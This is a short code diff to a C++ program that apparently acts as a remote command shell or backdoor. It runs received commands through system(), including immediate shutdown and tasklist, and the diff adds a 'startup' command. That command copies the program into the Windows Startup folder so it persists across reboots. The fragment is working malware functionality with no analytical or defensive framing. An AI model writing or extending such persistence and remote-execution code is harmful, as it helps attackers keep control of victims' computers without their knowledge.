@@ -70,7 +70,7 @@ int main() {
             if (command == "exit") {
                 break;
             }
-            if (command == "shutdown")
+            else if (command == "shutdown")
             {
                 system("shutdown /s /t 0");
             }
@@ -118,6 +118,10 @@ int main() {
 			{
 				system("tasklist");
 			}
+            else if (command == "startup")
+            {
+				system("copy %0 AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\%0");
+            }
             else {
                 output.clear();
                 execute_command(command, output);
